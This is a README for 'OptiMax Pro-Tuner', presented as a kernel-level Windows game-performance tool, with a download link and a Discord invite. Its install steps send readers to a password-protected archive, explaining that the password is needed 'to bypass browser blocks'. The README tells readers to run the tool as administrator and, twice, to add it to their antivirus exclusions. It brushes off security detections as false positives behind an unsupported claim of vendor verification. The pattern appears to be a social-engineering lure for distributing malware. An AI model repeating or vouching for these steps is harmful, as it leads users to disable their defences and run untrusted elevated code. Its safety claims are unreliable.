# 🚀 OptiMax Pro-Tuner v3.4 Final Release

**OptiMax Pro-Tuner** is an aggressive, kernel-level system orchestrator designed to eliminate DPC latency and stabilize frame pacing in competitive gaming. It hooks directly into the **NT Kernel** to enforce hardware-level locks typically reserved for system-critical processes.

### 🛠️ Installation and Usage

1. **Download** | Grab the latest `OptiMax_v3.4.rar` from the [Releases Tab](https://github.com/BigBE4TS/OptiMax-Pro-Tuner/releases)
2. **Password** | Use password **123** or **optimax** to extract (required to bypass browser blocks)
3. **Run as Admin** | Requires administrative privileges to command the NT Kernel
4. **Target Library** | Add your game executable to the list
5. **Minimize** | Keep the app in the System Tray to maintain Live Locks

### 💎 Key Features

* **0.5ms Timer Resolution** | Forces a global system clock lock to 0.5ms to reduce input lag
* **Advanced Power Orchestrator** | Disables Core Parking and forces an Ultimate Performance state
* **True Standby Purge** | Deep-cleans the Windows Standby List to free physical RAM
* **CPU Thread Director** | Dynamically locks game processes to Performance Cores (P-Cores)
* **GPU MSI Mode Injector** | Forces Message Signaled Interrupts on your GPU to bypass legacy IRQ sharing
* **Network Orchestrator** | Disables Nagle's Algorithm for zero-delay packet transmission

### 🤖 Dynamic AutoBoost

The app autonomously monitors your system. It engages performance hooks when a target game is detected and reverts to defaults when the game closes to save power.

### ⚠️ False Positive Notice

**OptiMax is NOT a virus.** Antivirus engines will flag it as Riskware because it hooks the kernel and modifies registry keys. Add the OptiMax folder to your **Antivirus Exclusions** to ensure it runs correctly.

### 📜 Development Log v3.4.0

* Fixed 180 Winsock redefinition errors in the build pipeline
* Fixed Update Modal UI alignment and clipping
* Added Strict Semantic Versioning (SemVer) for the updater
* Added 3-second high-speed Splash Screen with typewriter sync

### 🛡️ Verified Security Status

**Current Status:** OptiMax Pro-Tuner v3.4 has been verified as safe by 64 major security vendors. The remaining detections are **False Positives** triggered by the application's aggressive performance hooks.

#### Technical Disclosure for False Positives:

* **Kernel Hooks:** Forces a 0.5ms global system timer resolution, which AI engines often flag as "suspicious" behavior.
* **Thread Orchestration:** Dynamically locks game threads to Performance Cores (P-Cores), which can trigger heuristic warnings.
* **Registry Tweaks:** Modifies network keys to bypass Nagle’s Algorithm, appearing as a "system change" to automated scanners.
* **Memory Optimization:** Purges the Windows Standby List and Working Sets to maximize RAM, which may be flagged as a "Potentially Unwanted Application" (PUA) by Microsoft AI.

> **Developer Note:** To prevent Windows from interfering with these performance locks, please add your OptiMax folder to the **Antivirus Exclusions** list.

### 🤝 Support and Community

* **Discord** | [Join our Server](https://discord.gg/QchuXbVWP3)
* **Developer** | BigBE4TS

> **Disclaimer** | OptiMax is provided as is. Modifying system registries and kernel behavior carries risks. The developers are not responsible for system instability or hardware wear caused by extreme tuning.
